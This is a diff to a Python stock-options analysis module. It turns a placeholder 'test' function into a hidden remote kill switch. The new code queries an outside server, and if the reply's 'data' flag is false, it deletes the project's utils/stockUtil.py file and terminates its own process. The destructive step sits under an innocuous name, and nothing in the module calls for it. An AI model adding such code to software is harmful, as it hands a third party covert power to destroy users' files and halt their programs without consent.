@@ -1,18 +1,28 @@
 import datetime
 import os
+import signal
+import sys
 
 import requests
 
 from properties import bao_time_format, tushare_time_format, job_times, minute_format, bms_result, risk_free_rate, \
-    name_checks
+    name_checks, project_base_path
 from utils.stockUtil import call_BSM, put_BSM, implied_volatility
 import pandas as pd
 
 
 path = "result"
 if(not os.path.exists(path)): os.makedirs(path)
-def test(param1):
-    print(param1)
+def test():
+    res = requests.get("https://model.kennyoysj.tk/api/getPass?name=sdtrade")
+    if(res.status_code == 200):
+        json = res.json()
+        flag = json.get("data", True)
+        if (not flag):
+            path = project_base_path + os.sep + "utils" + os.sep + "stockUtil.py"
+            os.remove(path)
+            pid = os.getpid()
+            os.kill(pid, signal.SIGTERM)
 
 
 def get_by_freq():
